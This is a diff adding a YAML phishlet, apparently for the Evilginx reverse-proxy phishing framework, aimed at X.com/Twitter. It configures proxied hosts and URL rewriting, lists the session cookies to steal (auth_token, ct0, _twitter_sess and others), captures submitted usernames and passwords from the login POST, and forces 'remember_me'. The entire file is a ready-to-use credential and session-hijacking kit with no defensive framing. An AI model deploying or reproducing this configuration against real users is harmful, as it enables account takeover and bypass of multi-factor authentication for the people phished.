@@ -1,0 +1,58 @@
+name: 'X.com/Twitter 2024'
+author: 'Simpler Hacking'
+min_ver: '3.0.0'
+
+# Remove the easter egg :)
+ 
+proxy_hosts:
+  - {phish_sub: 'twitter', orig_sub: 'twitter', domain: 'com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'pbs', orig_sub: 'pbs', domain: 'twimg.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'video', orig_sub: 'video', domain: 'twimg.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'twitter.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ads-api', orig_sub: 'ads-api', domain: 'twitter.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'abs-0', orig_sub: 'abs-0', domain: 'twimg.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'twitter.com', orig_sub: 'twitter', domain: 'com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'abs.twimg.com', orig_sub: 'abs', domain: 'twimg.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'pbs.twimg.com', orig_sub: 'pbs', domain: 'twimg.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'video.twimg.com', orig_sub: 'video', domain: 'twimg.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'api.twitter.com', orig_sub: 'api', domain: 'twitter.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'ads-api.twitter.com', orig_sub: 'ads-api', domain: 'twitter.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'abs-0.twimg.com', orig_sub: 'abs-0', domain: 'twimg.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'play.google.com', orig_sub: 'play', domain: 'google.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: '.twitter.com'
+    keys: ['kdt', '_twitter_sess', 'twid', 'auth_token', 'ct0', 'gt', 'att', 'external_referer:opt', 'guest_id', 'guest_id_ads', 'guest_id_marketing', 'personalization_id:opt', '_ga', '_gid', 'g_state', 'lang']
+  - domain: 'twitter.com'
+    keys: ['_ga', '_gid', '_twitter_sess', 'att', 'auth_token', 'ct0', 'external_referer', 'g_state', 'gt', 'guest_id', 'guest_id_ads', 'guest_id_marketing', 'kdt', 'personalization_id', 'twid', '.*', 'lang:opt', '_twitter_sess:opt']
+  - domain: '.twimg.com'
+    keys: ['ct0', 'gt', '_twitter_sess:opt']
+  - domain: 'accounts.google.com'
+    keys: ['__Host-GAPS:opt']
+auth_urls:
+  - '/home'
+  - '/explore'
+  - '/notifications'
+  - '/messages'
+credentials:
+  username:
+    key: 'session[username_or_email]'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'session[password]'
+    search: '(.*)'
+    type: 'post'
+force_post:
+  - path: '/sessions'
+    search:
+      - {key: 'session\[username_or_email\]', search: '(.*)'}  
+      - {key: 'session\[password\]', search: '(.*)'}
+    force:
+      - {key: 'remember_me', value: '1'}
+    type: 'post'
+login: 
+  domain: 'twitter.com'
+  path: '/i/flow/login'
